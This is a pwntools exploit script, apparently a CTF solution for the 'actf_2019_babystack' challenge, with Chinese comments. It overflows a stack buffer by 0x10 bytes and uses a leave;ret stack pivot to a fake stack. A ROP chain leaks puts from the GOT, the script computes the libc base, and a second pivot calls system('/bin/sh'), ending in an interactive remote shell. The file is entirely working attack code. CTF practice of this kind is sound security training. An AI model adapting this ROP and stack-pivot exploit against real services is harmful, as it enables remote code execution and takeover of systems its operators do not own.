from pwn import *

r = remote('node5.buuoj.cn', 25292)
elf = ELF(r'./actf_2019_babystack')
libc = ELF(r'../libc/libc6_2.27-0ubuntu3_amd64.so')
context.log_level = 'debug'

# 边界检查在 0xE0 以内, 而s变量大小为D0, 只能溢出0x10 ===>> 栈迁移（伪造栈）
r.sendlineafter(b'>', b'224')
r.recvuntil(b'saved at ')
buf_addr = int(r.recvuntil(b'\n', drop=True), 16)
print(f"buf_addr: {buf_addr}")

# main_addr = elf.symbols['main']
main_addr = 0x4008F6
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400ad3
ret = 0x400709
leave_ret = 0x400a18

# 伪造栈
payload = b'A' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)  # puts泄露got地址，并返回main_addr
payload = payload.ljust(0xD0, b'A')  # padding
payload += p64(buf_addr) + p64(leave_ret)  # 布置rbp迁移的地址 + leave
r.sendafter(b'>', payload)
puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_addr: {hex(puts_addr)}")

base_addr = puts_addr - libc.sym['puts']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

r.sendlineafter(b'>', b'224')
r.recvuntil(b'saved at ')
buf_addr = int(r.recvuntil(b'\n', drop=True), 16)
print(f"buf_addr: {buf_addr}")

# 伪造栈 => system(sh)
payload2 = b'A' * 8 + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
payload2 = payload2.ljust(0xD0, b'A')  # padding
payload2 += p64(buf_addr) + p64(leave_ret)
r.sendafter(b'>', payload2)
r.interactive()
